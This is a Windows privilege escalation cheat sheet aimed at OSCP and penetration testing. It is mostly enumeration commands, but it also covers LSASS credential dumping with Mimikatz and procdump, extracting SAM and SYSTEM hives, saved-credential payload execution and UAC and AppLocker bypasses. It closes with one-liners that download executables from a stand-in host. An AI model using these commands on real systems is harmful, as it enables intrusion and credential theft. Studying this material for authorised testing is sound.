    Windows Privilege Escalation Guide

    Overview

    This guide is designed for OSCP and penetration testing scenarios. It organizes Windows privilege escalation techniques in a methodical, phase-based approach after gaining initial access.

    Important

    Always run automated tools like winPEAS.exe alongside manual enumeration for comprehensive coverage.

    Phase 1: Initial Enumeration

    System Information

hostname
whoami /all
set

    User & Group Enumeration

    net user

wmic useraccount get domain,name,sid

    File & Folder Permissions

    :: Check permissions for a specific file
icacls "C:\path\to\your\file.txt"

:: Check permissions for a specific folder
icacls "C:\path\to\your\folder"

:: Save permissions to a file for backup/review
icacls "C:\path\to\your\folder" /save C:\temp\permissions.txt

:: To restore permissions from the file
icacls "C:\path\to\your" /restore C:\temp\permissions.txt

:: To grant permission to a file /t - set recursevely | /c - continue when error
icacls "C:\path\to\your" /grant hostname\username:R /t /c

    # Get permissions (ACL) for a specific file
Get-Acl C:\path\to\your\file.txt

# Display the Access Control List (ACL) in a more readable list format
Get-Acl C:\path\to\your\file.txt | Format-List

# View just the access rules for a file or folder
(Get-Acl C:\path\to\your\folder).Access

# List permissions for all items in a directory and format as a table
Get-ChildItem C:\path\to\your\folder | ForEach-Object { Get-Acl $_.FullName } | Select-Object Path, Owner, Group

    Understanding Windows Permissions

    Permissions in Windows are managed through Access Control Lists (ACLs). Each file and folder has an ACL, which is a list of Access Control Entries (ACEs). Each ACE specifies which user or group has what kind of access.

    Common Permission Codes:

    icacls Code PowerShell Name Description
    (F) FullControl Full control. Users can modify, add, move, and delete files, as well as change permissions.
    (M) Modify Modify. Users can read, write, modify, and delete files and subfolders.
    (RX) ReadAndExecute Read and execute. Users can view file contents and run applications.
    (R) Read Read. Users can view file contents and properties.
    (W) Write Write. Users can write to a file or add files to a folder.
    (D) Delete Delete. Users can delete a file or folder.

    Special Permission Flags:

    • CI (Container Inherit): Subfolders will inherit these permissions.
    • OI (Object Inherit): Files within the folder will inherit these permissions.

    Mandatory Integrity Levels

    Windows uses Mandatory Integrity Control (MIC) to restrict access based on integrity levels. These appear in icacls output and determine what processes can interact with files/folders.

    Integrity Levels (Lowest to Highest):

    Level Code Description Typical Use
    Untrusted (NW) Lowest integrity level Rarely used, severely restricted
    Low (LW) Low integrity Internet-facing applications, sandboxed browsers
    Medium (MW) Medium integrity (default) Standard user processes, most applications
    High (HW) High integrity Administrative processes, elevated applications
    System (SW) System integrity Core Windows services, kernel-mode processes

    Why This Matters for Privilege Escalation:

    • A Medium integrity process cannot modify High integrity files, even if ACL permissions allow it
    • If you have a Medium integrity shell but are in the Administrators group, you're restricted by UAC
    • Check your current integrity level: whoami /groups | findstr "Mandatory"
    • Files/folders with Low or Medium mandatory levels are easier targets for modification

    Example icacls Output: 

    C:\temp\file.txt NT AUTHORITY\SYSTEM:(I)(F)
                 BUILTIN\Administrators:(I)(F)
                 BUILTIN\Users:(I)(RX)
                 Mandatory Label\Medium Mandatory Level:(NW)

    The last line shows the integrity level - in this case, Medium Mandatory Level with No Write-up (NW), meaning lower-integrity processes cannot write to this file.

    Scheduled Tasks

    What to Look For

    Tasks running with higher privileges where the executable or directory is writable.

    schtasks /query /fo LIST /v

    Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Get-ScheduledTaskInfo
Get-ScheduledTask -TaskName "<task>" | Format-List *
(Get-ScheduledTask -TaskName "<task>").Actions
Get-ScheduledTask | ForEach-Object {$_.Actions}
    • Check Schedule Task for the current user 
      Get-ScheduledTask | Where-Object { $_.Actions.Execute } | ForEach-Object { $task = $_; $path = [System.Environment]::ExpandEnvironmentVariables($_.Actions.Execute); if (Test-Path $path -PathType Leaf) { (Get-Acl $path -ErrorAction SilentlyContinue).Access | Where-Object { ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN\\Users") -and ($_.FileSystemRights -match "FullControl|Modify|Write") } | Select-Object @{N="TaskName";E={$task.TaskName}},@{N="Executable";E={$path}},@{N="RunAsUser";E={$task.Principal.UserId}},IdentityReference,FileSystemRights } } | Format-List

    Phase 2: Common Misconfigurations

    Unquoted Service Paths

    What to Look For

    Service paths without quotes and containing spaces. Windows may execute programs at each space if you can write to parent paths.

    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

    Get-CimInstance -ClassName win32_service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows*' } | Select-Object Name,DisplayName,PathName,StartMode

    Weak Service Permissions

    What to Look For

    Permissions to modify service configuration. Look for SERVICE_CHANGE_CONFIG rights.

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc sdshow <ServiceName>

    (Get-Acl (Get-Service <ServiceName> | Select-Object -ExpandProperty BinaryPathName)).AccessToString

    Weak Service File Permissions

    What to Look For

    Write permissions on service executables. Replace legitimate files with payloads.

    sc qc <ServiceName>
icacls <PathToServiceExecutable>

    (Get-Service <ServiceName>).BinaryPathName
Get-Acl <PathToServiceExecutable> | Format-List

    Insecure PATH Permissions

    What to Look For

    Writable directories in system PATH. Place malicious DLLs or executables for hijacking.

    echo %PATH%
icacls <DirectoryPath>

    $env:Path.Split(';') | ForEach-Object { Get-Acl -Path $_ | Format-List }

    AlwaysInstallElevated

    What to Look For

    Both registry keys set to 1 allows any user to install MSI packages with SYSTEM privileges.

    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"

    Weak Registry Permissions

    What to Look For

    Writable registry keys for services. Modify ImagePath to point to malicious executables.

    accesschk.exe /accepteula -uvkw hklm\system\currentcontrolset\services

    Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" | Format-List

    Autorun & Startup Applications

    What to Look For

    Writable startup locations or executables that run with elevated privileges on login.

    Check These Locations:

    • HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    • HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
    • HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    • HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    • C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    • C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    Get-Item -Path Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

    Scheduled Tasks

    What to Look For

    Tasks running with higher privileges where the executable or directory is writable.

    schtasks /query /fo LIST /v

    Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Get-ScheduledTaskInfo

    Phase 3: Credentials & Privileges

    Password Hunting (Filesystem)

    Target Files

    Search for plaintext passwords in configuration files, scripts, and unattended installations.

    findstr /si password *.xml *.ini *.txt *.config
dir /s *password*
dir /s *unattend.xml*

    Get-ChildItem C:\ -Recurse -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue | Select-String -Pattern "password"

    Group Policy Preferences (GPP)

    Legacy Vulnerability

    Passwords stored in SYSVOL Group Policy XML files (older systems).

    findstr /S /I "cpassword" \\<DC_IP>\SYSVOL\*.xml

    Get-ChildItem \\<DC_IP>\SYSVOL\ -Recurse -Include *.xml | Select-String -Pattern "cpassword"

    Credential Dumping (Memory)

    Requires Admin

    Dump LSASS memory for passwords, hashes, and Kerberos tickets.

    Tools: - Mimikatz: sekurlsa::logonpasswords - Procdump: procdump.exe -ma lsass.exe lsass.dmp - PowerSploit: Invoke-Mimikatz

    SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

    High Priority

    These privileges allow escalation to SYSTEM using potato exploits.

    Check: 

    whoami /priv

    Exploit Tools: - Juicy Potato - Rotten Potato - PrintSpoofer

    SeBackupPrivilege

    High Priority

    Allows reading any file. Extract SAM and SYSTEM hives for offline hash cracking.

    Check: 

    whoami /priv

    Exploit: 

    reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save

    Saved Credentials (RunAs)

    Quick Win

    Check Credential Manager for saved credentials.

    Check: 

    cmdkey /list

    Exploit: 

    runas /user:<user> /savecred "C:\path\to\payload.exe"

    Phase 4: Advanced Techniques

    DLL Hijacking

    Detection Method

    Use Process Monitor to find DLL load failures.

    Steps:

    1. Run procmon.exe and filter for "NAME NOT FOUND" on DLL files
    2. Check if writable directory exists in PATH before legitimate DLL location
    3. Place malicious DLL with same name

    UAC Bypass

    When to Use

    You're a local admin with medium-integrity shell.

    Verification: 

    net localgroup administrators

    Next Steps: Find OS-specific public bypass exploits based on build number.

    AppLocker Bypass

    Restriction Evasion

    Use trusted Windows binaries to execute code.

    Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

    Common Bypasses: - regsvr32 - msiexec - Trusted paths like C:\Windows\Tasks

    Insecure GUI Applications

    Interactive Exploitation

    GUI apps running as admin can be abused via file dialogs.

    Method:

    1. Find GUI processes from other users
    2. Use "File → Open" dialogs to navigate to cmd.exe
    3. Execute with higher privileges
    Get-Process -IncludeUserName

    Windows Subsystem for Linux (WSL)

    Alternative Environment

    WSL may provide different filesystem access permissions.

    Check: 

    where wsl.exe
where bash.exe

    MSSQL Escalation

    Service Account Exploitation

    Enable xp_cmdshell with sysadmin access for command execution as service account.

    Check: 

    netstat -ano | findstr 1433
tasklist | findstr sqlservr


    Get-Service | Where-Object {$_.Name -like "*SQL*"}

    Phase 5: Kernel Exploits

    Last Resort

    Kernel exploits can cause system instability. Use only when other methods fail.

    Process

    1. Gather system information: 

      systeminfo

    2. Feed output to Windows-Exploit-Suggester-NG

    3. Match exploits to OS version and missing patches

    4. Test carefully in isolated environment first

    Supporting Techniques

    File Transfer Methods

    certutil -urlcache -f http://10.10.10.10/file.exe file.exe
bitsadmin /transfer job http://10.10.10.10/file.exe C:\temp\file.exe

    Invoke-WebRequest -Uri "http://10.10.10.10/file.exe" -OutFile "file.exe"
Start-BitsTransfer -Source "http://10.10.10.10/file.exe" -Destination "C:\temp\file.exe"
(New-Object Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "file.exe")
